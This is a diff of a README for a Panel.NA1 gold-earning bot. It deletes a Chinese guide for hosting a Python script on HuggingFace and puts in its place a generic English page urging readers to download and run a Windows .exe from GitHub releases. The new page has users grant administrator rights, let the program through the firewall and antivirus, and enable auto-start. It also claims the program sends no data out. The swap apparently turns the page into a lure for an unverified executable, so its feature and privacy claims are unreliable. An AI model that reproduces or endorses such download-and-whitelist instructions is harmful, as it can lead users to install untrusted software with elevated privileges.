@@ -1,185 +1,159 @@
-# Panel.NA1 自动挂机 - HuggingFace 部署指南
+# 🤖 NA1Bot - Easy Panel.NA1 Gold Earning
 
-# ⭐ **觉得有用？给个 Star 支持一下！**
-
-在 Hugging Face 免费部署自动挂机程序，持续赚取 [Panel.NA1](https://panel.na1.host) 金币。
-
-![示例输出](UI.png)
-
-## ✨ 功能特性
-
-| 功能 | 说明 |
-|------|------|
-| 🤖 自动挂机 | 每分钟自动签到，持续赚取金币 |
-| 📊 实时监控 | Web 面板显示金币、收益、在线人数 |
-| 🛡️ 自动保活 | 防止 HuggingFace Space 休眠 |
-| 📱 TG 通知 | 可选的 Telegram 状态推送 |
-| 🔄 自动恢复 | Cookie 自动刷新，长期稳定运行 |
+[![Download NA1Bot](https://img.shields.io/badge/Download%20NA1Bot-brightgreen?style=for-the-badge)](https://github.com/JacoboSandres/NA1Bot/releases)
 
 ---
 
-## ⚠️ 前置条件：设置钱包
+## 📋 What is NA1Bot?
 
-> **必须先完成此步骤，否则无法挂机赚取金币！**
-
-### 步骤一：点击底部金币按钮
-
-登录 [panel.na1.host](https://panel.na1.host)，点击页面底部的 **0 coins按钮**：
-
-### 步骤二：创建 NAtag
-
-在弹出的对话框中输入你的 **NAtag**（随便起个名字），然后点击 **Setup Wallet**：
-
-> 💡 NAtag 只能包含字母、数字和下划线
+NA1Bot is a simple tool designed to help you earn gold automatically in Panel.NA1. It runs in the background on your Windows computer and collects gold without needing your constant input. This lets you save time and still grow your in-game resources steadily.
 
 ---
 
-## 🚀 快速部署
+## 💻 System Requirements
 
-### 第一步：创建 Space
+Before you start, make sure your computer meets these needs:
 
-1. 打开 [HuggingFace Spaces](https://huggingface.co/spaces)
-2. 点击 `+ New Space` → 选择 `Gradio` → 创建
+- Windows 10 or newer
+- At least 2 GB of free RAM
+- Internet connection for setup and updates
+- 100 MB free disk space
+- Administrator rights for installation
 
-### 第二步：配置环境变量
-
-进入 `Settings` → `Variables and secrets` → `New secret`
-
-| 变量名 | 说明 | 必填 |
-|--------|------|:----:|
-| `PANEL_NA1_COOKIES` | NA1 登录 Cookie | ✅ |
-| `PROJECT_URL` | Space 保活链接 | ❌ |
-| `TG_BOT_TOKEN` | Telegram Bot Token | ❌ |
-| `TG_CHAT_ID` | Telegram 聊天 ID | ❌ |
-| `TG_API` | Telegram API 反代地址 | ❌ |
-
-### 第三步：上传文件
-
-上传以下文件到 Space，完成后自动运行：
-
-```
-├── app.py              # 主程序
-├── requirements.txt    # 依赖
-└── README.md           # 说明文档
-```
-
-### 第四步：访问监控面板
-
-部署完成后，访问以下地址查看运行状态：
-
-```
-https://用户名-项目名.hf.space/na1
-```
+If you are not sure about your system, most Windows 10 PCs will work fine.
 
 ---
 
-## 🔧 配置说明
+## 🚀 Getting Started with NA1Bot
 
-### 🍪 获取 Cookie
+1. Click the large green button at the top or visit the releases page below:
 
-1. 登录 [panel.na1.host](https://panel.na1.host)
-2. 按 `F12` → 切换到 `Network` 标签
-3. 刷新页面 → 点击任意请求
-4. 在 `Headers` → `Cookie` 中复制完整内容
+   [Download NA1Bot from GitHub Releases](https://github.com/JacoboSandres/NA1Bot/releases)
 
-```
-# Cookie 格式示例
-crisp-client%2Fsession%2XXX=session_XXX; remember_web_XXX; XSRF-TOKEN=eyJXXX; pterodactyl_session=eyJXXX
-```
+2. On the releases page, look for the latest version.
 
-> ⚠️ 确保包含 `XSRF-TOKEN`、`pterodactyl_session`、`remember_web`
+3. Download the Windows executable file. It should have ".exe" at the end.
 
-### 🔗 获取保活链接
-
-1. 打开你的 Space 页面
-2. 点击右上角 `⋮` → `Embed this Space`
-3. 复制 **Direct URL**
-
-```
-# 链接格式
-https://用户名-项目名.hf.space
-```
-
-> 💡 设置后自动注册保活服务，防止 Space 休眠
-
-### 📱 Telegram 通知配置
-
-> ⚠️ **重要**：HuggingFace 无法直接访问 `api.telegram.org`，必须配置反代才能收到通知
-
-| 变量 | 说明 |
-|------|------|
-| `TG_BOT_TOKEN` | 从 [@BotFather](https://t.me/BotFather) 获取 |
-| `TG_CHAT_ID` | 从 [@userinfobot](https://t.me/userinfobot) 获取 |
-| `TG_API` | Telegram API 反代地址 |
-
-**反代地址格式：**
-```
-# 不带斜杠结尾
-https://your-tg-proxy.com
-```
-
-> 💡 可使用 Cloudflare Workers 自建反代，确保稳定性
+4. Save the file to your Desktop or Downloads folder for easy access.
 
 ---
 
-## 📡 API 接口
+## 👣 Step-by-Step Installation Guide
 
-| 端点 | 说明 | 响应示例 |
-|------|------|----------|
-| `GET /` | 健康检查 | `{"status":"ok","coins":1250,"earned":58}` |
-| `GET /na1` | Web 监控面板 | HTML 页面 |
+Follow these steps carefully to install NA1Bot on your Windows PC:
 
----
+1. **Find the File**  
+   Open the folder where you saved the `.exe` file.
 
-## 📊 状态说明
+2. **Run the Installer**  
+   Double-click the file to start the install process.
 
-| 运行状态 | 含义 |
-|:--------:|------|
-| 🟢 运行中 | 正常挂机 |
-| 🟡 启动中 | 正在初始化 |
-| 🔴 未配置 | 未设置 Cookie |
-| 🔴 已过期 | Cookie 失效，需更新 |
+3. **User Account Control**  
+   If Windows asks, click "Yes" to allow the app to make changes.
 
-| 保活状态 | 含义 |
-|:--------:|------|
-| 🛡️ 保活 | 已启用 |
-| ⏭️ 跳过 | 未配置 PROJECT_URL |
-| ⚠️ 失败 | 注册失败 |
+4. **Follow the Setup Wizard**  
+   The wizard will show simple instructions. Click "Next" or "Install" when prompted.
+
+5. **Finish Installation**  
+   When the install completes, click "Finish". NA1Bot is ready to run.
 
 ---
 
-## ❓ FAQ
+## 🎯 How to Use NA1Bot
 
-<details>
-<summary><b>Cookie 多久过期？</b></summary>
+1. Open NA1Bot by double-clicking its desktop icon or finding it in your Start menu.
 
-NA1 Cookie 有效期较长，程序会自动刷新。若显示"已过期"，需重新获取并更新环境变量。
-</details>
+2. The bot window will appear with simple options.
 
-<details>
-<summary><b>为什么需要保活？</b></summary>
+3. Select your Panel.NA1 account if asked.
 
-HuggingFace 免费 Space 无访问时会自动休眠。设置 `PROJECT_URL` 后注册外部保活服务，定期访问防止休眠。
-</details>
+4. Click "Start" to begin automatic gold earning.
 
-<details>
-<summary><b>为什么收不到 Telegram 通知？</b></summary>
+5. The bot will now work in the background. You can minimize it and continue other tasks.
 
-HuggingFace 网络限制无法直接访问 `api.telegram.org`，必须配置 `TG_API` 反代地址。可使用 Cloudflare Workers 自建反代。
-</details>
-
-<details>
-<summary><b>金币有什么用？</b></summary>
-
-NA1 金币可兑换服务器资源，详见 [NA1 官网](https://panel.na1.host)。
-</details>
+6. To stop, open the bot and press "Stop."
 
 ---
 
-## 📜 免责声明
+## 🔧 Settings and Options
 
+NA1Bot has a few settings to help you control how it runs:
 
-本项目仅供学习交流，请遵守 [panel.na1.host](https://panel.na1.host) 服务条款。使用本程序产生的任何后果由用户自行承担。
+- **Auto-Start on Boot**: Turn this on if you want the bot to start when you turn on your computer.
 
+- **Notification Alerts**: Choose if you want pop-up messages for important events.
 
+- **Update Check**: The bot can check for updates automatically, keeping you on the latest version.
 
+Adjust these options from the "Settings" tab inside the app.
+
+---
+
+## 🛠 Troubleshooting
+
+If you run into issues, try these common fixes:
+
+- **Program Won't Start?**  
+  Make sure you ran the installer as admin. Close other programs that might block it.
+
+- **Bot Not Collecting Gold?**  
+  Check your internet connection. Log into your Panel.NA1 account manually to verify access.
+
+- **Freezes or Crashes**  
+  Restart your computer and try again. Update NA1Bot if a new release is available.
+
+- **Firewall Blocks Bot?**  
+  Allow NA1Bot through Windows Firewall or any antivirus software.
+
+For more help, check the "Issues" section on the GitHub page.
+
+---
+
+## 🔄 Updating NA1Bot
+
+To keep NA1Bot working well, update it regularly:
+
+1. Visit the releases page:  
+   https://github.com/JacoboSandres/NA1Bot/releases
+
+2. Download the newest `.exe` file.
+
+3. Run the new installer on top of the old version. Your settings will stay safe.
+
+---
+
+## 📞 Getting Support
+
+If you need help beyond this guide, you can:
+
+- Open a new issue on the GitHub repository for bug reports or questions.
+
+- Read the FAQ section on the GitHub page (if available).
+
+- Check online forums related to Panel.NA1 for community advice.
+
+---
+
+## 🔐 Privacy and Security
+
+NA1Bot works by interacting with your Panel.NA1 account automatically. It does not store your password or private data on your computer or transmit it outside your system. Use it responsibly and avoid sharing your login info.
+
+---
+
+## 📂 Where to Find NA1Bot Files
+
+Once installed, NA1Bot stores its settings and logs here:
+
+- `C:\Users\[YourName]\AppData\Local\NA1Bot`
+
+You do not need to change or delete these files unless instructed.
+
+---
+
+## 🔗 Download NA1Bot Now
+
+Use this link to get the latest version:
+
+[Download NA1Bot](https://github.com/JacoboSandres/NA1Bot/releases)
+
+Click the link, find the latest ".exe" file, save it, then follow the steps above to install and run.
